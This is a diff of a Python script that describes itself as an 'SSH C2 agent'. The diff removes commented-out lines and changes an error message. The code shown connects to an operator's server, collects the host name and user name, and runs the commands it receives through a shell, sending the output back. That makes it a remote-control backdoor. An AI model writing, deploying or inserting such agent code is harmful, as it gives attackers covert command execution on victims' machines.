@@ -5,7 +5,6 @@ import os
 import socket
 import getpass
 import argparse
-#import shlex
 
 parser = argparse.ArgumentParser(description="SSH C2 agent configuration to communicate with server")
 parser._action_groups.pop()
@@ -35,8 +34,7 @@ def SSH_comm():
         host = socket.gethostname()
         user = getpass.getuser()
     except Exception as ex:
-        print("[!] Error, possible invalid sever details. Use -h for help.")
-        #print("Debug info:\n" + str(ex))
+        print("[!] Unable to connect to server.")
         sys.exit()
 
     if start_session.active:
@@ -54,9 +52,7 @@ def SSH_comm():
                     CWD = os.getcwd()
                     start_session.send(f"[*] Changed directory to {CWD}\n")
                 else:
-                    #command_out = subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT, shell=True)
                     command_out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
-                    #print(command)
                     if (len(command_out) == 0):
                         start_session.send("[*] Command executed. No shell output.\n")
                     else:
